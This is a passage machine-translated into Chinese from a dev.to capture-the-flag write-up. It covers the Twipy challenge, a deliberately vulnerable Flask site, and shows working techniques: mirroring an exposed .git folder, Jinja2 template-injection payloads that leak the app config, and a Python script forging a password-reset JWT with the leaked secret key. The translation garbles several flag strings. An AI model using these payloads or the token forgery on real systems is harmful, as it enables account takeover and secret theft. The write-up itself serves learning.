# øxoposɇcmɇɇtuᵽ[0x 70]挑战报道

> 原文：<https://dev.to/jpdias/oxoposc-mtu-0x70-challenge-write-up-46d>

“总部位于波尔图的øxoposɇc 集团是由热衷于安全的 g33ks 创立的。meetup 的主要任务是通过利用小组成员的专业知识和技能来讨论和解决紧急的安全问题。”这是由[杜亚特](https://github.com/DDuarte)和安德烈·莫莱斯撰写的 0x70 meetup 版挑战赛的报道。<！-更- >

聚会每月举行一次，欢迎[加入](https://www.meetup.com/0xOPOSEC/)。

[![Index Page/Login](img/abb279a55bf121bce55ab09d27da1c56.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--qZZ9E9TD--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://jpdias.img/oposec/index.png)

迎接挑战。我们得到了一个名为 Twipy(图片)的类似 Twitter 的网站的 URL。从名字就可以断定，也许是 Python 制作的。我们知道有 4 个标志:

*   标志 1 -版本控制很容易
*   标签 2 - Debug 101
*   旗帜 3 -漂亮的推特伊芙🧪
*   标志 4 -这个链接是迷惑人的

所有的标志都有相同的格式: *{flag}Rand0mStuff*

## 侦察

首先，让我们在不创建帐号的情况下进行侦察。启动搜索引擎也许会给我们一些线索。结果可以总结如下(200 个状态代码结果):

```
1
2
3
4
5

$ dirsearch -u "example.com" -e py,php
|- 200 - 1KB - /.git/
|- 200 - 735B - /.gitignore
|- 200 - 3KB - /auth/login
|- 200 - 19KB - /debug.log 
```

Enter fullscreen mode Exit fullscreen mode

于是，从 dirsearch 中，我们找到了一个暴露的`.git`文件夹和一个`debug.log`文件。用`wget`下载所有东西。

```
1
2

$ wget --mirror -I .git http://example.com/.git/
$ wget http://example.com/debug.log 
```

Enter fullscreen mode Exit fullscreen mode

在继续之前，启动`nmap`只返回端口 22 (SSH)和 80 (HTTP)，所以这里没什么不寻常的。我们可以尝试找到 SSH 的凭证，但是从一开始就希望渺茫。在所有可能的可注入字段(登录表单、账户重置和`next`查询参数)上触发`sqlmap`也导致了一个死胡同。

[![Timeline/Home](img/ecbe981b1240f3068f717bdafb093346.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--8Ev3MKD8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://jpdias.img/oposec/timeline.png)

继续前进，创建一个账户，我们最终得到一个时间轴(图片)。在图片中，我们可以看到另一个用户的帖子， *Willis Adams* ，其中有两条消息，其中一条是私人消息，我们只能看到前 6 个字符:*{ flag } * * * * * * * * * * * * * * * * * * * * * * * * * * * * **。只有*威利斯亚当斯*用户可以看到星号后面的信息，但它是一个标志。

该网站的其他功能，如更新个人资料，探索其他用户的推文和搜索导致了死胡同。

## 标志 1 -版本控制容易

找到`.git`文件夹后，下一个明显的步骤是尝试恢复所有源代码。通过制作一个`$ git status`，我们可以看到所有被删除的文件。

```
1

$ git checkout -- . 
```

Enter fullscreen mode Exit fullscreen mode

运行上述命令将所有文件恢复到它们的最新版本(在被删除之前)。通过检查`$ git log`，我们发现了一些奇怪的提交消息，如*不公开邮件密码:)*，但我无法通过分析 git 差异找到任何东西。

因为我们知道所有的标志都有相同的格式，所以在所有的文件和修订中进行详尽的搜索:

```
1

$ git grep ".*flag.*" $(git rev-list --all) 
```

Enter fullscreen mode Exit fullscreen mode

我们可以发现，在提交`eb3cb7e1ec4e73b0850ec4a6c4a89122599d213d`中，文件`twipy.py`有下面一行代码:

```
1

return '{flag}Us3_vault_for_no_p4sswords_1n_s0urce_cod3.' 
```

Enter fullscreen mode Exit fullscreen mode

因此，我们有了第一面旗帜:

> > { flag } Us3 _ vault _ for _ no _ p4ss words _ 1n _ s source _ cod 3 .
> > 
> > T3】

## 标志 2 -调试 101

在我们的侦察阶段，我们发现一艘`debug.log`暴露在外，可以接近。分析它的内容，我们可以立即找到下一个标志:

```
1

2019-01-10 17:52:25,489 ERROR: Unhandled Exception: {flag}b3_c4r3ful_w1th_Wh4t_y0u_l34v3_pUbl1c [in /twipy/app/errors/handlers.py:21] 
```

Enter fullscreen mode Exit fullscreen mode

此外，我们发现调用`http://example.com/flag`是将该异常写入日志文件的触发器。

> > 【标志】B3 _ C4 r3ful _ w1th _ wh 4t _ y0u _ l34 v3 _ public 1c

## 旗帜 3——漂亮的推特前夜🧪

由于我们现在可以访问应用程序的源代码，并确定应用程序是用 Python 编写的，首先想到的事情之一是[服务器端模板注入](https://portswigger.net/blog/server-side-template-injection)。读了一些关于这个主题的教程和文章，我发现这个是最简单的:[皮科 CTF 2018](https://s0cket7.com/picoctf-web) 的烧瓶挑战赛。

为了发现网站是否易受攻击，我们简单地发推文`{{ 7 * 7 }}`，在警告信息框中我们得到以下响应:*你刚刚发布:49*

所以我们的代码正在被执行。为了首先利用模板注入，我们必须了解正在使用的模板引擎是什么。为此，探针`{{7 * '7'}}`将在 Twig 中产生`49`，在 Jinja2 中产生`7777777`，如果没有使用模板语言，则两者都不会。在我们的例子中，回应是:*你刚刚发布:7777777* ，所以我们在处理 Jinja2。

通过分析`requirements.txt`文件中的 Python 包，我们也可以得出相同的结论。我们还可以识别易受攻击的代码:

```
1
2

# TODO add user input validation
post_content = render_template_string('''You just posted: %s ''' % form.post.data) 
```

Enter fullscreen mode Exit fullscreen mode

下一步是尝试获取配置，发布`{{ config.items() }}`，这将产生一个包含配置中包含的大量信息的 alert-info，包括:

*   标志:{ flag } v4 lid 4t3 _ always _ us3r _ 1 nput
*   SECRET _ KEY:yjmscaeao 5 zom 3 gvoxhroym 5 hgjttdpq 7 uxaihnecxc =
*   SQLALCHEMY _ DATABASE _ URI:MySQL+pymysql://twipy:rkzdwtkaz 9 ugn wf @ db/twip

所以我们有了第三面旗帜:

> > { flag } v4 lid 4t 3 _ always _ us3r _ 输入
> > 
> > T3】

## 标志 4 -此链接令人迷惑

容易注意到的一点是，每个用户都有一个唯一的 UUID，例如*AE 1677 ca-f7bd-431 a-8280-8 fdf 4 aa 801 ca*。我们也可以访问其他用户的个人资料，获得他们独特的 UUID。

```
1
2
3

god_user = User.query.filter_by(email='willis.adams@example.com').first()
if god_user:
    user.follow(god_user) 
```

Enter fullscreen mode Exit fullscreen mode

分析创建新用户帐户的代码，我们注意到所有用户都必须跟随用户 *Willis Adams* ，UUID*70a 82737-a6d 9-4284-93 db-0600 db 6 f 05 ca*。

```
1
2

def dummy_password(size=8, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for i in range(size)) 
```

Enter fullscreen mode Exit fullscreen mode

由于密码是在`twipy.py`中随机生成的，暴力破解会花费太多时间。另一个攻击媒介是恢复密码机制。通过分析恢复链接的结构，我们注意到它类似于一个 [JWT 令牌](https://jwt.io/):

`http://example.com/auth/reset_password/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InphZnlmb2t1QGdldG5hZGEuY29tIiwiaWQiOiJhZTE2NzdjYS1mN2JkLTQzMWEtODI4MC04ZmRmNGFhODAxY2EiLCJleHAiOjE1NDc3MjY4NzEuMzgwMzQ2LCJuYW1lIjoidHNhciJ9.pDrpqe-GB8Qo2xEdD5pDA9wIOtNpOl3GAq19LBFZJXs`。

在`models.py`文件中，我们有以下逻辑用于分配和验证恢复密码令牌(JWT 令牌)。

```
1
2
3
4
5
6
7
8
9
10
11
12
13

def get_token(self, expires_in=600):
    return jwt.encode(
        {'id': self.id, 'name': self.name, 'email': self.email, 'exp': time() + expires_in},
        current_app.config['SECRET_KEY'],
        algorithm='HS256').decode('utf-8')

@staticmethod
def verify_token(token):
    try:
        id = jwt.decode(token, current_app.config['SECRET_KEY'], verify=False, algorithms=['HS256'])['id']
    except:
        return
    return User.query.get(id) 
```

Enter fullscreen mode Exit fullscreen mode

由于没有调用数据库或 nounce，如果我们知道目标用户的 SECRET_KEY(来自第三个标志)和 UUID，我们就可以制作自己的 JWT 令牌，在本例中，目标用户是**神用户**。

通过编写一个简单的脚本(查看 requirements.txt 中用于 JWT - PyJWT 的 Python 包)，我们可以得到所讨论的 JWT 令牌。

```
1
2
3
4
5
6
7
8
9
10
11
12
13

import jwt
from time import time

secret_key = 'yJmsCAeao5zOM3gvoxHrOyM5HGJTTDpQ7UxAIHneCxc='
id = "70a82737-a6d9-4284-93db-0600db6f05ca"
name = "Willis Adams"
email = "willis.adams@example.com"
expires_in = 600;

print jwt.encode(
    {'id': id, 'name': name, 'email': email, 'exp': time() + expires_in},
    secret_key,
    algorithm='HS256').decode('utf-8') 
```

Enter fullscreen mode Exit fullscreen mode

通过给*神用户*设置新密码，我们可以看到他们的私人推文，从而获得标志。

> > { flag } 4 lw4ys _ v3r 1 fy _ your _ t0k 3n s

## 总结

这是一个很好的网络挑战，总能学到更多关于 infosec 和 CTFs 的知识。感谢@dduarte 和@AndreMorais 的挑战。